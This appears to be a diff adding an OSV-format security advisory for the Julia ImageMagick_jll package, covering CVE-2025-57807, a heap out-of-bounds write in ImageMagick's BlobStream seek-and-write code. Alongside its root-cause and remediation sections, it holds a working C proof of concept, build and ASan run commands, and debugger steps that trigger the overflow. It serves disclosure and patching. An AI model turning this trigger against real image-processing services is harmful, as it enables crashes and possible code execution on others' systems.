@@ -1,0 +1,105 @@
+{
+    "schema_version": "1.8.0",
+    "id": "JLSEC-2026-926",
+    "modified": "2026-07-30T16:02:27.435Z",
+    "published": "2026-07-30T16:02:27.435Z",
+    "upstream": [
+        "CVE-2025-57807",
+        "GHSA-23hg-53q6-hqfg",
+        "EUVD-2025-27126"
+    ],
+    "summary": "ImageMagick BlobStream Forward-Seek Under-Allocation",
+    "details": "**Reporter:** Lumina Mescuwa\n**Product:** ImageMagick 7 (MagickCore)\n**Component:** `MagickCore/blob.c` (Blob I/O - BlobStream)\n**Tested:** 7.1.2-0 (source tag) and 7.1.2-1 (Homebrew), macOS arm64, clang-17, Q16-HDRI\n**Impact:** Heap out-of-bounds **WRITE** (attacker-controlled bytes at attacker-chosen offset) → memory corruption; potential code execution\n\n* * *\n\n## Executive Summary\n\nFor memory-backed blobs (**BlobStream**), [`SeekBlob()`](https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134) permits advancing the stream **offset** beyond the current end without increasing capacity. The subsequent [`WriteBlob()`](https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938) then expands by **`quantum + length`** (amortized) instead of **`offset + length`**, and copies to `data + offset`. When `offset ≫ extent`, the copy targets memory beyond the allocation, producing a deterministic heap write on 64-bit builds. No 2⁶⁴ arithmetic wrap, external delegates, or policy settings are required.\n\n* * *\n\n## Affected Scope\n\n  - **Versions confirmed:** 7.1.2-0, 7.1.2-1\n\n  - **Architectures:** Observed on macOS arm64; architecture-agnostic on LP64\n  - Paths: MagickCore blob subsystem — **BlobStream** ([`SeekBlob()`](https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134) and [`WriteBlob()`](https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938)).\n  - **Not required:** External delegates; special policies; integer wraparound\n\n* * *\n\n## Technical Root Cause\n\n**Types (LP64):**\n`offset: MagickOffsetType` (signed 64-bit)\n`extent/length/quantum: size_t` (unsigned 64-bit)\n`data: unsigned char*`\n\n**Contract mismatch:**\n\n  - [`SeekBlob()`](https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134) (BlobStream) updates `offset` to arbitrary positions, including past end, **without** capacity adjustment.\n\n  - [`WriteBlob()`](https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938) tests `offset + length >= extent` and grows **by** `length + quantum`, doubles `quantum`, reallocates to `extent + 1`, then:\n    \n    ```\n    q = data + (size_t)offset;\n    memmove(q, src, length);\n    ```\n    \n    There is **no guarantee** that `extent ≥ offset + length` post-growth. With `offset ≫ extent`, `q` is beyond the allocation.\n\n**Wrap-free demonstration:**\nInitialize `extent=1`, write one byte (`offset=1`), seek to `0x10000000` (256 MiB), then write 3–4 bytes. Growth remains << `offset + length`; the copy overruns the heap buffer.\n\n* * *\n\n## Exploitability & Reachability\n\n  - **Primitive:** Controlled bytes written at a controlled displacement from the buffer base.\n\n  - **Reachability:** Any encode-to-memory flow that forward-seeks prior to writing (e.g., header back-patching, reserved-space strategies). Even if current encoders/writers avoid this, the API contract **permits** it, thus creating a latent sink for first- or third-party encoders/writers.\n  - **Determinism:** Once a forward seek past end occurs, the first subsequent write reliably corrupts memory.\n\n* * *\n\n## Impact Assessment\n\n  - **Integrity:** High - adjacent object/metadata overwrite plausible.\n\n  - **Availability:** High - reliably crashable (ASan and non-ASan).\n  - **Confidentiality:** High - Successful exploitation to RCE allows the attacker to read all data accessible by the compromised process.\n  - **RCE plausibility:** Typical of heap OOB writes in long-lived image services; allocator/layout dependent.\n\n* * *\n\n## CVSS v3.1 Rationale (9.8)\n\n  - **AV:N / PR:N / UI:N** - server-side image processing is commonly network-reachable without auth or user action.\n\n  - **AC:L** - a single forward seek + write suffices; no races or specialized state.\n  - **S:U** - corruption localized to the ImageMagick process.\n  - **C:H / I:H / A:H** - A successful exploit leads to RCE, granting full control over the process. This results in a total loss of Confidentiality (reading sensitive data), Integrity (modifying files/data), and Availability (terminating the service).\n\n_Base scoring assumes successful exploitation; environmental mitigations are out of scope of Base metrics._\n\n* * *\n\n## Violated Invariant\n\n> **Before copying `length` bytes at `offset`, enforce `extent ≥ offset + length` with overflow-checked arithmetic.**\n\nThe BlobStream growth policy preserves amortized efficiency but fails to enforce this **per-write** safety invariant.\n\n* * *\n\n## Remediation (Principle)\n\nIn [`WriteBlob()`](https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938) (BlobStream case):\n\n 1. **Checked requirement:**\n    `need = (size_t)offset + length;` → if `need < (size_t)offset`, overflow → fail.\n\n 2. **Ensure capacity ≥ need:**\n    `target = MagickMax(extent + quantum + length, need);`\n    (Optionally loop, doubling `quantum`, until `extent ≥ need` to preserve amortization.)\n 3. **Reallocate to `target + 1` before copying;** then perform the move.\n\n**Companion hardening (recommended):**\n\n  - Document or restrict [`SeekBlob()`](https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134) on BlobStream so forward seeks either trigger explicit growth/zero-fill or require the subsequent write to meet the invariant.\n\n  - Centralize blob arithmetic in checked helpers.\n  - Unit tests: forward-seek-then-write (success and overflow-reject).\n\n* * *\n\n## Regression & Compatibility\n\n  - **Behavior change:** Forward-seeked writes will either allocate to required size or fail cleanly (overflow/alloc-fail).\n\n  - **Memory profile:** Single writes after very large seeks may allocate large buffers; callers requiring sparse behavior should use file-backed streams.\n\n* * *\n\n## Vendor Verification Checklist\n\n  - Reproduce with a minimal in-memory BlobStream harness under ASan.\n\n  - Apply fix; verify `extent ≥ offset + length` at all write sites.\n  - Add forward-seek test cases (positive/negative).\n  - Audit other growth sites (`SetBlobExtent`, stream helpers).\n  - Clarify BlobStream seek semantics in documentation.\n  - Unit test: forward seek to large offset on **BlobStream** followed by 1–8 byte writes; assert either growth to `need` or clean failure.\n\n* * *\n\n# PoC / Reproduction / Notes\n\n## Environment\n\n  - **OS/Arch:** macOS 14 (arm64)\n\n  - **Compiler:** clang-17 with AddressSanitizer\n  - **ImageMagick:** Q16-HDRI\n  - **Prefix:** `~/opt/im-7.1.2-0`\n  - **`pkg-config`:** from PATH (no hard-coded `/usr/local/...`)\n\n* * *\n\n## Build ImageMagick 7.1.2-0 (static, minimal)\n\n```bash\n./configure --prefix=\"$HOME/opt/im-7.1.2-0\" --enable-hdri --with-quantum-depth=16 \\\n  --disable-shared --enable-static --without-modules \\\n  --without-magick-plus-plus --disable-openmp --without-perl \\\n  --without-x --without-lqr --without-gslib\n\nmake -j\"$(sysctl -n hw.ncpu)\"\nmake install\n\n\"$HOME/opt/im-7.1.2-0/bin/magick\" -version > magick_version.txt\n```\n\n* * *\n\n## Build & Run the PoC (memory-backed BlobStream)\n\n**`poc.c`:**\n_Uses private headers (`blob-private.h`) to exercise blob internals; a public-API variant (custom streams) is feasible but unnecessary for triage._\n\n```c\n// poc.c\n\n#include <stdio.h>\n\n#include <stdlib.h>\n\n#include <MagickCore/MagickCore.h>\n\n#include <MagickCore/blob.h>\n\n#include \"MagickCore/blob-private.h\"\n\n  \n\nint main(int argc, char **argv) {\n\nMagickCoreGenesis(argv[0], MagickTrue);\n\nExceptionInfo *e = AcquireExceptionInfo();\n\nImageInfo *ii = AcquireImageInfo();\n\nImage *im = AcquireImage(ii, e);\n\nif (!im) return 1;\n\n  \n\n// 1-byte memory blob → BlobStream\n\nunsigned char *buf = (unsigned char*) malloc(1);\n\nbuf[0] = 0x41;\n\nAttachBlob(im->blob, buf, 1); // type=BlobStream, extent=1, offset=0\n\nSetBlobExempt(im, MagickTrue); // don't free our malloc'd buf\n\n  \n\n// Step 1: write 1 byte (creates BlobInfo + sets offset=1)\n\nunsigned char A = 0x42;\n\n(void) WriteBlob(im, 1, &A);\n\nfprintf(stderr, \"[+] after 1 byte: off=%lld len=%zu\\n\",\n\n(long long) TellBlob(im), (size_t) GetBlobSize(im));\n\n  \n\n// Step 2: seek way past end without growing capacity\n\nconst MagickOffsetType big = (MagickOffsetType) 0x10000000; // 256 MiB\n\n(void) SeekBlob(im, big, SEEK_SET);\n\nfprintf(stderr, \"[+] after seek: off=%lld len=%zu\\n\",\n\n(long long) TellBlob(im), (size_t) GetBlobSize(im));\n\n  \n\n// Step 3: small write → reallocation grows by quantum+length, not to offset+length\n\n// memcpy then writes to data + offset (OOB)\n\nconst unsigned char payload[] = \"PWN\";\n\n(void) WriteBlob(im, sizeof(payload), payload);\n\n  \n\n// If we get here, it didn't crash\n\nfprintf(stderr, \"[-] no crash; check ASan flags.\\n\");\n\n  \n\n(void) CloseBlob(im);\n\nDestroyImage(im); DestroyImageInfo(ii); DestroyExceptionInfo(e);\n\nMagickCoreTerminus();\n\nreturn 0;\n\n}\n```\n\n* * *\n\n`run:`\n\n```bash\n# Use the private prefix for pkg-config\nexport PKG_CONFIG_PATH=\"$HOME/opt/im-7.1.2-0/lib/pkgconfig:$PKG_CONFIG_PATH\"\n\n# Strict ASan for crisp failure\nexport ASAN_OPTIONS='halt_on_error=1:abort_on_error=1:detect_leaks=0:fast_unwind_on_malloc=0'\n\n# Compile (static link pulls transitive deps via --static)\nclang -std=c11 -g -O1 -fno-omit-frame-pointer -fsanitize=address -o poc poc.c \\\n  $(pkg-config --cflags MagickCore-7.Q16HDRI) \\\n  $(pkg-config --static --libs MagickCore-7.Q16HDRI)\n\n# Execute and capture\n./poc 2>&1 | tee asan.log\n```\n\n**Expected markers prior to the fault:**\n\n```\n[+] after 1 byte: off=1 len=1\n[+] after seek:  off=268435456 len=1\n```\n\nAn ASan **WRITE** crash in [`WriteBlob`](https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938) follows (top frames: `WriteBlob blob.c:<line>`, then `_platform_memmove` / `__sanitizer_internal_memmove`).\n\n* * *\n\n## Debugger Verification (manual)\n\nLLDB can be used to snapshot the invariants; ASan alone is sufficient.\n\n```\nlldb ./poc\n(lldb) settings set use-color false\n(lldb) break set -n WriteBlob\n(lldb) run\n\n# First stop (prime write)\n(lldb) frame var length\n(lldb) frame var image->blob->type image->blob->offset image->blob->length image->blob->extent image->blob->quantum image->blob->mapped\n(lldb) continue\n\n# Second stop (post-seek write)\n(lldb) frame var length\n(lldb) frame var image->blob->type image->blob->offset image->blob->length image->blob->extent image->blob->quantum image->blob->mapped\n(lldb) expr -- (unsigned long long)image->blob->offset + (unsigned long long)length\n(lldb) expr -- (void*)((unsigned char*)image->blob->data + (size_t)image->blob->offset)\n\n# Into the fault; if inside memmove (no locals):\n(lldb) bt\n(lldb) frame select 1\n(lldb) frame var image->blob->offset image->blob->length image->blob->extent image->blob->quantum\n```\n\n**Expected at second stop:**\n`type = BlobStream` · `offset ≈ 0x10000000` (256 MiB) · `length ≈ 3–4` · `extent ≈ 64 KiB` (≪ `offset + length`) · `quantum ≈ 128 KiB` · `mapped = MagickFalse` · `data + offset` far beyond base; next `continue` crashes in `_platform_memmove`.\n\n* * *\n\n## Credits\n\n**Reported by:** Lumina Mescuwa\n\n* * *",
+    "severity": [
+        {
+            "type": "CVSS_V3",
+            "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            "source": "NVD"
+        }
+    ],
+    "affected": [
+        {
+            "ranges": [
+                {
+                    "type": "SEMVER",
+                    "events": [
+                        {
+                            "introduced": "0"
+                        },
+                        {
+                            "fixed": "7.1.2004+0"
+                        }
+                    ]
+                }
+            ],
+            "package": {
+                "ecosystem": "Julia",
+                "name": "ImageMagick_jll",
+                "purl": "pkg:julia/ImageMagick_jll?uuid=c73af94c-d91f-53ed-93a7-00f77d67a9d7"
+            }
+        }
+    ],
+    "references": [
+        {
+            "type": "WEB",
+            "url": "https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e"
+        },
+        {
+            "type": "WEB",
+            "url": "https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg"
+        },
+        {
+            "type": "WEB",
+            "url": "https://github.com/advisories/GHSA-23hg-53q6-hqfg"
+        },
+        {
+            "type": "WEB",
+            "url": "https://lists.debian.org/debian-lts-announce/2025/09/msg00012.html"
+        },
+        {
+            "type": "WEB",
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-57807"
+        }
+    ],
+    "credits": [
+        {
+            "name": "mescuwa",
+            "contact": [
+                "https://github.com/mescuwa"
+            ],
+            "type": "REPORTER"
+        }
+    ],
+    "database_specific": {
+        "license": "CC-BY-4.0",
+        "sources": [
+            {
+                "id": "CVE-2025-57807",
+                "imported": "2026-07-30T14:08:44.392Z",
+                "modified": "2026-06-17T09:43:28.377Z",
+                "published": "2025-09-05T22:15:34.340Z",
+                "url": "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2025-57807",
+                "html_url": "https://nvd.nist.gov/vuln/detail/CVE-2025-57807",
+                "database_specific": {
+                    "status": "Modified"
+                }
+            },
+            {
+                "id": "GHSA-23hg-53q6-hqfg",
+                "imported": "2026-07-30T14:09:50.877Z",
+                "modified": "2025-11-03T21:35:33Z",
+                "published": "2025-09-05T20:09:19Z",
+                "url": "https://api.github.com/advisories/GHSA-23hg-53q6-hqfg",
+                "html_url": "https://github.com/advisories/GHSA-23hg-53q6-hqfg"
+            },
+            {
+                "id": "EUVD-2025-27126",
+                "imported": "2026-07-30T14:08:55.697Z",
+                "modified": "2025-11-03T18:13:45Z",
+                "published": "2025-09-05T21:16:02Z",
+                "url": "https://euvdservices.enisa.europa.eu/api/enisaid?id=EUVD-2025-27126",
+                "html_url": "https://euvd.enisa.europa.eu/vulnerability/EUVD-2025-27126"
+            }
+        ]
+    }
+}
